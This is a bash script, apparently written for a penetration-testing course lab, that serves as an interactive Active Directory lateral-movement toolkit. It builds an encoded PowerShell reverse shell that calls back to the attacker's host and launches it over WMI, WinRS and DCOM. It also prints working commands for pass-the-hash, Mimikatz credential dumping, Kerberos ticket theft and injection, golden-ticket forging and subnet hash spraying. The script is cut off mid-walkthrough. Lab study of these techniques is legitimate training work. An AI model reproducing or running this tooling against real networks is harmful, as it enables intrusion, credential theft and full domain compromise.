#!/bin/bash
# ══════════════════════════════════════════════════════════════════
#   AD LATERAL MOVEMENT TOOLKIT  v2.0
#   Covers: WMI | WinRM | PsExec | PTH | OverPTH | PTT | DCOM
#           Golden Ticket | Shadow Copy | Persistence
#   Modes:  Kali→Windows  |  Windows→Windows (pivot)
# ══════════════════════════════════════════════════════════════════

# ─── Colors ────────────────────────────────────────────────────────
R='\033[0;31m'   ; LR='\033[1;31m'
G='\033[0;32m'   ; LG='\033[1;32m'
Y='\033[1;33m'   ; LY='\033[0;33m'
B='\033[0;34m'   ; LB='\033[1;34m'
M='\033[0;35m'   ; LM='\033[1;35m'
C='\033[0;36m'   ; LC='\033[1;36m'
W='\033[1;37m'   ; DIM='\033[2m'
BOLD='\033[1m'   ; NC='\033[0m'

# ─── Global vars ────────────────────────────────────────────────────
KALI_IP=""       ; TARGET_IP=""    ; TARGET_HOST=""
DOMAIN=""        ; USERNAME=""     ; PASSWORD=""
HASH=""          ; LPORT="443"     ; MODE=""
REVSHELL_B64=""  ; REVSHELL_CMD=""

# ══════════════════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════════════════
banner() {
    clear
    echo -e "${R}"
    echo "  ╔══════════════════════════════════════════════════════════╗"
    echo "  ║        AD LATERAL MOVEMENT TOOLKIT  v2.0                ║"
    echo "  ║  WMI·WinRM·PsExec·PTH·OPTH·PTT·DCOM·Golden·Shadow      ║"
    echo "  ║  Kali→Win  |  Win→Win  |  Persistence  |  Impacket      ║"
    echo "  ╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "  ${DIM}Kali:${LC}${KALI_IP:-?}${NC} ${DIM}Target:${LC}${TARGET_IP:-?}${NC} ${DIM}User:${LC}${DOMAIN:+$DOMAIN\\\\}${USERNAME:-?}${NC} ${DIM}Hash:${LC}${HASH:+SET}${HASH:-none}${NC} ${DIM}Port:${LC}${LPORT}${NC}\n"
}

sec()     { echo -e "\n${LC}${BOLD}┌─[ $1 ]${NC}"; echo -e "${LC}${BOLD}└──────────────────────────────────────────${NC}\n"; }
info()    { echo -e "  ${LB}[*]${NC} $1"; }
ok()      { echo -e "  ${LG}[+]${NC} $1"; }
warn()    { echo -e "  ${Y}[!]${NC} $1"; }
step()    { echo -e "\n  ${W}${BOLD}▶ $1${NC}"; }
kali()    { printf "  ${LG}${BOLD}kali\$${NC}  ${BOLD}%s${NC}\n" "$1"; }
win()     { printf "  ${LY}${BOLD}CMD>  ${NC} ${BOLD}%s${NC}\n" "$1"; }
ps()      { printf "  ${M}${BOLD}PS>   ${NC} ${BOLD}%s${NC}\n" "$1"; }
mimi()    { printf "  ${R}${BOLD}mimikatz#${NC} ${BOLD}%s${NC}\n" "$1"; }
note()    { echo -e "  ${DIM}  ↳ $1${NC}"; }
div()     { echo -e "  ${DIM}  ─────────────────────────────────────────${NC}"; }
pause()   { echo ""; read -p "$(echo -e "  ${DIM}[Enter to continue]${NC} ")" _; }
ask()     { read -p "$(echo -e "  ${Y}[?]${NC} $1: ")" "$2"; }
askpass() { read -s -p "$(echo -e "  ${Y}[?]${NC} $1: ")" "$2"; echo ""; }

# ══════════════════════════════════════════════════════════════════
#  REVERSE SHELL GENERATOR
# ══════════════════════════════════════════════════════════════════
gen_revshell() {
    local ip="${1:-$KALI_IP}" port="${2:-$LPORT}"
    local raw="\$client = New-Object System.Net.Sockets.TCPClient(\"${ip}\",${port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    REVSHELL_B64=$(python3 -c "import base64; print(base64.b64encode('''${raw}'''.encode('utf-16-le')).decode())" 2>/dev/null)
    if [[ -z "$REVSHELL_B64" ]]; then
        warn "python3 encode failed — using placeholder"
        REVSHELL_B64="<RUN_encode.py>"
    fi
    REVSHELL_CMD="powershell -nop -w hidden -e ${REVSHELL_B64}"
}

show_listener() {
    step "Start listener on Kali FIRST:"
    kali "nc -lnvp ${LPORT}"
    div
}

# ══════════════════════════════════════════════════════════════════
#  INFO COLLECTION
# ══════════════════════════════════════════════════════════════════
collect_info() {
    sec "Environment Setup"
    ask "Your Kali IP (LHOST)"    KALI_IP
    ask "Target IP"               TARGET_IP
    ask "Target Hostname (opt)"   TARGET_HOST
    ask "Domain (e.g. corp.com)"  DOMAIN
    ask "Username"                USERNAME
    askpass "Password (hidden)"   PASSWORD
    ask "NTLM Hash (opt)"         HASH
    ask "Listener Port [443]"     inp
    [[ -n "$inp" ]] && LPORT="$inp"

    ok "Info saved!"
    gen_revshell "$KALI_IP" "$LPORT"
}

update_info() {
    collect_info
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 1 — WMI
# ══════════════════════════════════════════════════════════════════
menu_wmi() {
    while true; do
        banner; sec "WMI — Windows Management Instrumentation"
        info "Port: 135 + high range (19152-65535) | Requires: Local Admin"
        echo ""
        echo -e "  ${W}1)${NC} wmic classic (deprecated, Win→Win)"
        echo -e "  ${W}2)${NC} PowerShell CimSession (Win→Win)"
        echo -e "  ${W}3)${NC} WMI Reverse Shell — full attack (Win→Win)"
        echo -e "  ${W}4)${NC} Impacket wmiexec (Kali→Win)"
        echo -e "  ${W}5)${NC} Impacket wmiexec Pass-the-Hash (Kali→Win)"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        case $c in
        1)  sec "wmic — Classic"
            step "Run on pivot Windows machine (as jeff):"
            win "wmic /node:${TARGET_IP} /user:${USERNAME} /password:${PASSWORD} process call create \"calc\""
            note "ReturnValue=0 means success. calc runs in Session 0 (invisible)."
            div
            win "wmic /node:${TARGET_IP} /user:${USERNAME} /password:${PASSWORD} process call create \"cmd /c whoami > C:\\\\out.txt\""
            note "Read result: type \\\\${TARGET_IP}\\C\$\\out.txt  (needs admin share)"
            ;;
        2)  sec "PowerShell CimSession — WMI"
            step "Run in PowerShell on pivot machine:"
            ps "\$username = '${USERNAME}'"
            ps "\$password = '${PASSWORD}'"
            ps "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force"
            ps "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString"
            ps "\$Options = New-CimSessionOption -Protocol DCOM"
            ps "\$Session = New-Cimsession -ComputerName ${TARGET_IP} -Credential \$credential -SessionOption \$Options"
            ps "\$Command = 'calc'"
            ps "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\$Command}"
            note "Answer to lab Q1: New-CimSession"
            ;;
        3)  sec "WMI Full Reverse Shell"
            gen_revshell
            show_listener
            step "Run in PowerShell on pivot machine:"
            ps "\$username = '${USERNAME}'"
            ps "\$password = '${PASSWORD}'"
            ps "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force"
            ps "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString"
            ps "\$Options = New-CimSessionOption -Protocol DCOM"
            ps "\$Session = New-Cimsession -ComputerName ${TARGET_IP} -Credential \$credential -SessionOption \$Options"
            ps "\$Command = '${REVSHELL_CMD}'"
            ps "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\$Command}"
            ;;
        4)  sec "Impacket wmiexec — Kali→Win"
            local dp="${DOMAIN:+${DOMAIN}/}"
            step "Interactive shell:"
            kali "impacket-wmiexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP}"
            div
            step "Read flag directly:"
            kali "impacket-wmiexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP} 'type C:\\Users\\Administrator\\Desktop\\flag.txt'"
            note "No listener needed. Shell runs directly from Kali."
            ;;
        5)  sec "Impacket wmiexec — Pass-the-Hash"
            local h="${HASH:-<NTLM_HASH>}"
            local dp="${DOMAIN:+${DOMAIN}/}"
            kali "impacket-wmiexec -hashes :${h} ${dp}${USERNAME}@${TARGET_IP}"
            note "Format: LMhash:NThash  (use :NTLM to skip LM)"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 2 — WinRM / WinRS
# ══════════════════════════════════════════════════════════════════
menu_winrm() {
    while true; do
        banner; sec "WinRM / WinRS"
        info "Ports: 5985 (HTTP) / 5986 (HTTPS) | Requires: Administrators or Remote Management Users"
        echo ""
        echo -e "  ${W}1)${NC} WinRS run command (Win→Win)"
        echo -e "  ${W}2)${NC} WinRS reverse shell (Win→Win)"
        echo -e "  ${W}3)${NC} PowerShell New-PSSession (Win→Win)"
        echo -e "  ${W}4)${NC} Invoke-Command one-liner (Win→Win)"
        echo -e "  ${W}5)${NC} Evil-WinRM with password (Kali→Win)"
        echo -e "  ${W}6)${NC} Evil-WinRM Pass-the-Hash (Kali→Win)"
        echo -e "  ${W}7)${NC} CrackMapExec / NetExec WinRM (Kali→Win)"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        local hr="${TARGET_HOST:-$TARGET_IP}"
        case $c in
        1)  sec "WinRS — Remote Commands"
            win "winrs -r:${hr} -u:${USERNAME} -p:${PASSWORD} \"cmd /c hostname & whoami\""
            div
            win "winrs -r:${hr} -u:${USERNAME} -p:${PASSWORD} \"cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt\""
            note "Works with hostname or IP. Domain user only."
            ;;
        2)  sec "WinRS — Reverse Shell"
            gen_revshell; show_listener
            win "winrs -r:${hr} -u:${USERNAME} -p:${PASSWORD} \"${REVSHELL_CMD}\""
            ;;
        3)  sec "PowerShell Remoting — PSSession"
            ps "\$cred = New-Object System.Management.Automation.PSCredential('${USERNAME}',(ConvertTo-SecureString '${PASSWORD}' -AsPlaintext -Force))"
            ps "\$s = New-PSSession -ComputerName ${TARGET_IP} -Credential \$cred"
            ps "Enter-PSSession \$s"
            div
            note "Or by ID after New-PSSession returns:"
            ps "Enter-PSSession 1"
            ;;
        4)  sec "Invoke-Command — One-liner"
            ps "\$cred = New-Object System.Management.Automation.PSCredential('${USERNAME}',(ConvertTo-SecureString '${PASSWORD}' -AsPlaintext -Force))"
            ps "Invoke-Command -ComputerName ${TARGET_IP} -Credential \$cred -ScriptBlock { whoami; hostname; Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt }"
            ;;
        5)  sec "Evil-WinRM — Kali→Win"
            kali "evil-winrm -i ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}'"
            div
            kali "evil-winrm -i ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN}"
            note "Install: gem install evil-winrm"
            ;;
        6)  sec "Evil-WinRM — Pass-the-Hash"
            local h="${HASH:-<NTLM_HASH>}"
            kali "evil-winrm -i ${TARGET_IP} -u ${USERNAME} -H '${h}'"
            ;;
        7)  sec "CrackMapExec / NetExec — WinRM"
            kali "cme winrm ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN}"
            kali "nxc winrm ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN} -x 'whoami'"
            note "Green [+] = valid creds + WinRM access"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 3 — PsExec
# ══════════════════════════════════════════════════════════════════
menu_psexec() {
    while true; do
        banner; sec "PsExec — SMB-Based Execution"
        info "Port: 445 | Requires: Local Admin + ADMIN\$ share + File/Printer Sharing"
        echo ""
        echo -e "  ${W}1)${NC} Sysinternals PsExec64 (Win→Win)"
        echo -e "  ${W}2)${NC} Impacket psexec (Kali→Win)"
        echo -e "  ${W}3)${NC} Impacket smbexec — stealthier (Kali→Win)"
        echo -e "  ${W}4)${NC} Impacket atexec — task scheduler (Kali→Win)"
        echo -e "  ${W}5)${NC} CrackMapExec SMB exec (Kali→Win)"
        echo -e "  ${W}6)${NC} Metasploit psexec (Kali→Win)"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        local dp="${DOMAIN:+${DOMAIN}/}"
        local wp="${DOMAIN:+${DOMAIN}\\\\}"
        case $c in
        1)  sec "Sysinternals PsExec64 — All Options"
            note "Location on lab machines: C:\\Tools\\SysinternalsSuite\\"
            note "Requires: Local Admin + ADMIN\$ share + File/Printer Sharing"
            echo ""

            step "A) Interactive session with -i flag (module exact syntax):"
            win ".\\PsExec64.exe -i \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
            note "-i = interactive session (required for GUI/interactive cmds)"
            note "target = hostname with \\\\ prefix (e.g. \\\\FILES04)"
            div

            step "B) Without -i (background/non-interactive):"
            win ".\\PsExec64.exe \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
            div

            step "C) Using IP instead of hostname:"
            win ".\\PsExec64.exe \\\\${TARGET_IP} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
            note "IP uses NTLM auth | Hostname uses Kerberos if tickets cached"
            div

            step "D) Using already-cached Kerberos ticket (no creds needed):"
            win ".\\PsExec.exe \\\\${TARGET_HOST:-files04} cmd"
            note "Works after Overpass-the-Hash / Golden Ticket injection"
            note "MUST use hostname not IP — IP forces NTLM and breaks Kerberos"
            div

            step "E) Run specific command (not interactive shell):"
            win ".\\PsExec64.exe -i \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} powershell"
            win ".\\PsExec64.exe \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd /c \"whoami & hostname\""
            div

            step "F) What PsExec does under the hood:"
            note "1. Writes psexesvc.exe into C:\\Windows\\ on target"
            note "2. Creates + starts a service on remote host"
            note "3. Runs your command as child of psexesvc.exe"
            note "4. Communicates via named pipes over SMB"
            div

            warn "Answer to lab Q: ADMIN\$ share must be available"
            ;;
        2)  sec "Impacket psexec — Kali"
            kali "impacket-psexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP}"
            div
            step "Pass-the-Hash:"
            kali "impacket-psexec -hashes :${HASH:-<HASH>} ${dp}${USERNAME}@${TARGET_IP}"
            note "Uploads psexesvc.exe to ADMIN\$ — not stealthy"
            ;;
        3)  sec "Impacket smbexec — no binary upload"
            kali "impacket-smbexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP}"
            kali "impacket-smbexec -hashes :${HASH:-<HASH>} ${dp}${USERNAME}@${TARGET_IP}"
            note "Creates a service but doesn't upload a binary — stealthier"
            ;;
        4)  sec "Impacket atexec — task scheduler"
            kali "impacket-atexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP} whoami"
            kali "impacket-atexec -hashes :${HASH:-<HASH>} ${dp}${USERNAME}@${TARGET_IP} 'type C:\\Users\\Administrator\\Desktop\\flag.txt'"
            note "Uses Task Scheduler service — different detection profile"
            ;;
        5)  sec "CrackMapExec / NetExec SMB"
            kali "cme smb ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN} -x 'whoami'"
            kali "cme smb ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN} -X 'Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt'"
            div
            kali "cme smb ${TARGET_IP} -u ${USERNAME} -H '${HASH:-<HASH>}' -d ${DOMAIN} -x 'whoami'"
            note "-x = cmd.exe  |  -X = PowerShell"
            ;;
        6)  sec "Metasploit psexec"
            kali "msfconsole -q -x \"use exploit/windows/smb/psexec; set RHOSTS ${TARGET_IP}; set SMBUser ${USERNAME}; set SMBPass '${PASSWORD}'; set SMBDomain ${DOMAIN}; run\""
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 4 — Pass-the-Hash (PTH)
# ══════════════════════════════════════════════════════════════════
menu_pth() {
    while true; do
        banner; sec "Pass-the-Hash (PTH)"
        info "Use NTLM hash instead of password | NTLM auth only (not Kerberos)"
        info "Requires: Local Admin | Port: 445 (SMB)"
        echo ""
        echo -e "  ${W}1)${NC} Impacket wmiexec PTH"
        echo -e "  ${W}2)${NC} Impacket psexec PTH"
        echo -e "  ${W}3)${NC} Impacket smbexec PTH"
        echo -e "  ${W}4)${NC} Evil-WinRM PTH"
        echo -e "  ${W}5)${NC} CrackMapExec PTH + subnet spray"
        echo -e "  ${W}6)${NC} xfreerdp PTH (RDP)"
        echo -e "  ${W}7)${NC} How to get NTLM hash"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        local h="${HASH:-<NTLM_HASH>}"
        local dp="${DOMAIN:+${DOMAIN}/}"
        case $c in
        1)  sec "wmiexec PTH"
            kali "impacket-wmiexec -hashes :${h} ${dp}${USERNAME}@${TARGET_IP}"
            note "Built-in local Administrator always works. Other local admins blocked post-2014 patch."
            ;;
        2)  sec "psexec PTH"
            kali "impacket-psexec -hashes :${h} ${dp}${USERNAME}@${TARGET_IP}"
            ;;
        3)  sec "smbexec PTH"
            kali "impacket-smbexec -hashes :${h} ${dp}${USERNAME}@${TARGET_IP}"
            ;;
        4)  sec "Evil-WinRM PTH"
            kali "evil-winrm -i ${TARGET_IP} -u ${USERNAME} -H '${h}'"
            ;;
        5)  sec "CrackMapExec PTH + Spray"
            kali "cme smb ${TARGET_IP} -u ${USERNAME} -H '${h}' -d ${DOMAIN} -x 'whoami'"
            div
            note "Spray whole subnet to find where hash works:"
            kali "cme smb ${TARGET_IP%.*}.0/24 -u ${USERNAME} -H '${h}' -d ${DOMAIN}"
            note "Green [+] [Pwn3d!] = local admin access confirmed"
            ;;
        6)  sec "xfreerdp PTH (Restricted Admin Mode)"
            kali "xfreerdp3 /v:${TARGET_IP} /u:${USERNAME} /pth:${h} /d:${DOMAIN} /cert:ignore +dynamic-resolution"
            note "Requires 'Restricted Admin Mode' enabled on target RDP"
            ;;
        7)  sec "How to Get NTLM Hash"
            step "Option A — Mimikatz on compromised Windows:"
            mimi "privilege::debug"
            mimi "sekurlsa::logonpasswords"
            div
            step "Option B — secretsdump from Kali:"
            kali "impacket-secretsdump ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP}"
            div
            step "Option C — from NTDS.dit offline:"
            kali "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 5 — Overpass-the-Hash (OPTH)
# ══════════════════════════════════════════════════════════════════
menu_opth() {
    while true; do
        banner; sec "Overpass-the-Hash (NTLM Hash → Kerberos TGT)"
        info "Convert NTLM hash to Kerberos ticket — bypass NTLM restrictions"
        info "Requires: Mimikatz on Windows | Hash of target user"
        echo ""
        echo -e "  ${W}1)${NC} Mimikatz sekurlsa::pth — spawn PS as another user"
        echo -e "  ${W}2)${NC} Generate TGT via net use trick"
        echo -e "  ${W}3)${NC} Use TGT with PsExec (Kerberos only)"
        echo -e "  ${W}4)${NC} Impacket getTGT (Kali→Win)"
        echo -e "  ${W}5)${NC} Full walkthrough — step by step"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        local h="${HASH:-<NTLM_HASH>}"
        case $c in
        1)  sec "sekurlsa::pth — Spawn process as user"
            note "Run Mimikatz as Administrator on pivot machine"
            mimi "privilege::debug"
            mimi "sekurlsa::pth /user:${USERNAME} /domain:${DOMAIN} /ntlm:${h} /run:powershell"
            note "New PowerShell window opens — token is ${USERNAME}"
            note "whoami still shows your user — that's EXPECTED (token level)"
            ;;
        2)  sec "Generate TGT via net use"
            note "In the new PS window from sekurlsa::pth:"
            ps "klist"
            note "Should show 0 tickets — that's normal"
            div
            ps "net use \\\\${TARGET_HOST:-$TARGET_IP}"
            note "This forces Kerberos auth and caches a TGT"
            div
            ps "klist"
            note "Now you should see TGT (krbtgt) + TGS (cifs/host)"
            note "Answer to lab Q: klist"
            ;;
        3)  sec "Use TGT with PsExec"
            note "After TGT is cached (from net use):"
            ps "cd C:\\Tools\\SysinternalsSuite"
            ps ".\\PsExec.exe \\\\${TARGET_HOST:-files04} cmd"
            div
            warn "IMPORTANT: Use HOSTNAME not IP!"
            warn "IP forces NTLM — hostname uses Kerberos (where your ticket lives)"
            ;;
        4)  sec "Impacket getTGT (Kali)"
            kali "impacket-getTGT ${DOMAIN}/${USERNAME} -hashes :${h}"
            kali "export KRB5CCNAME=${USERNAME}.ccache"
            kali "impacket-psexec -k -no-pass ${DOMAIN}/${USERNAME}@${TARGET_HOST:-$TARGET_IP}"
            note "Kerberos from Kali requires /etc/krb5.conf or DC in /etc/hosts"
            ;;
        5)  sec "Full OPTH Walkthrough"
            step "1. Dump hash from cached creds (pivot Windows):"
            mimi "privilege::debug"
            mimi "sekurlsa::logonpasswords"
            note "Copy the NTLM hash for your target user"
            div
            step "2. Create new PS process with hash:"
            mimi "sekurlsa::pth /user:${USERNAME} /domain:${DOMAIN} /ntlm:${h} /run:powershell"
            div
            step "3. In new PS window — force TGT generation:"
            ps "net use \\\\${TARGET_HOST:-files04}"
            ps "klist"
            note "Verify TGT appears (krbtgt entry)"
            div
            step "4. Move laterally using PsExec (Kerberos):"
            ps ".\\PsExec.exe \\\\${TARGET_HOST:-files04} cmd"
            ps "whoami"
            ps "hostname"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 6 — Pass-the-Ticket (PTT)
# ══════════════════════════════════════════════════════════════════
menu_ptt() {
    while true; do
        banner; sec "Pass-the-Ticket (PTT)"
        info "Export TGS from another user's session → inject into yours"
        info "No admin required if ticket belongs to current user's session"
        echo ""
        echo -e "  ${W}1)${NC} Export all tickets with Mimikatz"
        echo -e "  ${W}2)${NC} Inject a .kirbi ticket"
        echo -e "  ${W}3)${NC} Verify injected ticket + access"
        echo -e "  ${W}4)${NC} Rubeus (modern alternative)"
        echo -e "  ${W}5)${NC} Full walkthrough — step by step"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        case $c in
        1)  sec "Export All Tickets"
            mimi "privilege::debug"
            mimi "sekurlsa::tickets /export"
            note "Saves .kirbi files in current directory"
            div
            ps "dir *.kirbi"
            note "Look for: [user@cifs-TARGET.kirbi] — that's the TGS you want"
            note "TGT = krbtgt in filename | TGS = cifs/host in filename"
            ;;
        2)  sec "Inject Ticket"
            note "Pick the cifs ticket for your target:"
            mimi "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi"
            note "Replace filename with actual file from 'dir *.kirbi'"
            note "No error = success"
            ;;
        3)  sec "Verify + Access"
            ps "klist"
            note "Should show ticket for target user @ domain"
            div
            ps "ls \\\\${TARGET_HOST:-web04}\\backup"
            note "Access the share — you now act as the ticket owner"
            ;;
        4)  sec "Rubeus — Modern PTT"
            note "Dump all tickets:"
            ps ".\\Rubeus.exe dump /nowrap"
            div
            note "Inject base64 ticket:"
            ps ".\\Rubeus.exe ptt /ticket:<base64_ticket>"
            div
            note "List tickets:"
            ps ".\\Rubeus.exe klist"
            div
            note "Request TGS for specific service:"
            ps ".\\Rubeus.exe asktgs /ticket:<TGT_base64> /service:cifs/${TARGET_HOST:-web04}.${DOMAIN} /ptt"
            ;;
        5)  sec "Full PTT Walkthrough"
            step "1. Log in as low-priv user (e.g. jen) on CLIENT76"
            step "2. Verify you can NOT access target:"
            ps "ls \\\\${TARGET_HOST:-web04}\\backup"
            note "Should get 'Access Denied'"
            div
            step "3. Export tickets from memory:"
            mimi "privilege::debug"
            mimi "sekurlsa::tickets /export"
            div
            step "4. Find the right ticket:"
            ps "dir *.kirbi | Select-String 'cifs-${TARGET_HOST:-web04}'"
            div
            step "5. Inject it:"
            mimi "kerberos::ptt [0;XXXX]-0-0-40810000-dave@cifs-${TARGET_HOST:-web04}.kirbi"
            div
            step "6. Verify and access:"
            ps "klist"
            ps "ls \\\\${TARGET_HOST:-web04}\\backup"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 7 — DCOM
# ══════════════════════════════════════════════════════════════════
menu_dcom() {
    while true; do
        banner; sec "DCOM — Distributed Component Object Model"
        info "Port: 135 (RPC) | Requires: Local Admin on target"
        info "Uses MMC20.Application COM object's ExecuteShellCommand method"
        echo ""
        echo -e "  ${W}1)${NC} DCOM test — spawn calc"
        echo -e "  ${W}2)${NC} DCOM reverse shell"
        echo -e "  ${W}3)${NC} Verify process running on target"
        echo -e "  ${W}4)${NC} Full walkthrough"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        case $c in
        1)  sec "DCOM — Test with calc"
            note "Run from elevated PowerShell on pivot machine:"
            ps "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"${TARGET_IP}\"))"
            ps "\$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",\$null,\"/c calc\",\"7\")"
            note "Answer to lab Q: ExecuteShellCommand"
            ;;
        2)  sec "DCOM Reverse Shell"
            gen_revshell; show_listener
            ps "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"${TARGET_IP}\"))"
            ps "\$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",\$null,\"${REVSHELL_CMD}\",\"7\")"
            ;;
        3)  sec "Verify Process on Target"
            note "On the target machine or via another method:"
            win "tasklist | findstr calc"
            win "tasklist | findstr powershell"
            note "Processes run in Session 0 (system service context)"
            ;;
        4)  sec "Full DCOM Walkthrough"
            step "1. Confirm on elevated PS on CLIENT74 (as jen):"
            ps "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"${TARGET_IP}\"))"
            div
            step "2. Test execution:"
            ps "\$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",\$null,\"/c calc\",\"7\")"
            div
            step "3. Replace with reverse shell:"
            gen_revshell; show_listener
            ps "\$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",\$null,\"${REVSHELL_CMD}\",\"7\")"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 8 — GOLDEN TICKET (Persistence)
# ══════════════════════════════════════════════════════════════════
menu_golden() {
    while true; do
        banner; sec "Golden Ticket — Persistence"
        info "Forge TGT using krbtgt hash → access ENTIRE domain"
        info "Requires: krbtgt NTLM hash + Domain SID"
        warn "CRITICAL: This is persistence — document and get explicit permission"
        echo ""
        echo -e "  ${W}1)${NC} Dump krbtgt hash (need DA on DC)"
        echo -e "  ${W}2)${NC} Get Domain SID"
        echo -e "  ${W}3)${NC} Create Golden Ticket + inject"
        echo -e "  ${W}4)${NC} Use ticket — access DC with PsExec"
        echo -e "  ${W}5)${NC} Impacket ticketer (Kali version)"
        echo -e "  ${W}6)${NC} Full walkthrough"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        local krbtgt="${HASH:-<KRBTGT_NTLM_HASH>}"
        local sid="<DOMAIN_SID>"
        case $c in
        1)  sec "Dump krbtgt Hash"
            note "Run Mimikatz AS DOMAIN ADMIN on DC:"
            mimi "privilege::debug"
            mimi "lsadump::lsa /patch"
            note "Copy the NTLM hash next to 'krbtgt' (RID 502)"
            div
            note "Alternative from Kali if you have DA creds:"
            kali "impacket-secretsdump ${DOMAIN}/Administrator:'${PASSWORD}'@${TARGET_IP}"
            note "Look for: krbtgt:502:aad3b...:HASH_HERE:::"
            ;;
        2)  sec "Get Domain SID"
            win "whoami /user"
            note "SID format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
            note "Drop the last part (RID) — use the first 3 number groups"
            div
            ps "Get-ADDomain | Select-Object DomainSID"
            div
            kali "impacket-getPac -targetUser ${USERNAME} ${DOMAIN}/${USERNAME}:'${PASSWORD}'"
            ;;
        3)  sec "Create + Inject Golden Ticket"
            note "Run on ANY machine (even non-domain joined):"
            mimi "kerberos::purge"
            mimi "kerberos::golden /user:${USERNAME} /domain:${DOMAIN} /sid:${sid} /krbtgt:${krbtgt} /ptt"
            mimi "misc::cmd"
            note "/ptt = inject directly into memory"
            note "User ID defaults to 500 (Administrator RID)"
            note "Groups default to DA, EA, Schema Admins — full access"
            ;;
        4)  sec "Use Golden Ticket with PsExec"
            note "After golden ticket injected (misc::cmd opened a new CMD):"
            win "cd C:\\Tools\\SysinternalsSuite"
            win "PsExec.exe \\\\DC1 cmd.exe"
            win "whoami /groups"
            note "Use HOSTNAME not IP — IP forces NTLM (ticket is Kerberos)"
            div
            warn "PsExec to IP = NTLM = BLOCKED"
            warn "PsExec to hostname = Kerberos = WORKS with golden ticket"
            ;;
        5)  sec "Impacket ticketer (Kali)"
            kali "impacket-ticketer -nthash ${krbtgt} -domain-sid ${sid} -domain ${DOMAIN} ${USERNAME}"
            kali "export KRB5CCNAME=${USERNAME}.ccache"
            kali "impacket-psexec -k -no-pass ${DOMAIN}/${USERNAME}@DC1.${DOMAIN}"
            note "Requires /etc/krb5.conf with realm config"
            ;;
        6)  sec "Full Golden Ticket Walkthrough"
            step "1. Gain DA access → RDP to DC as jeffadmin"
            step "2. Dump krbtgt hash:"
            mimi "privilege::debug"
            mimi "lsadump::lsa /patch"
            div
            step "3. Get domain SID on any machine:"
            win "whoami /user"
            div
            step "4. Move back to low-priv machine (CLIENT74 as jen)"
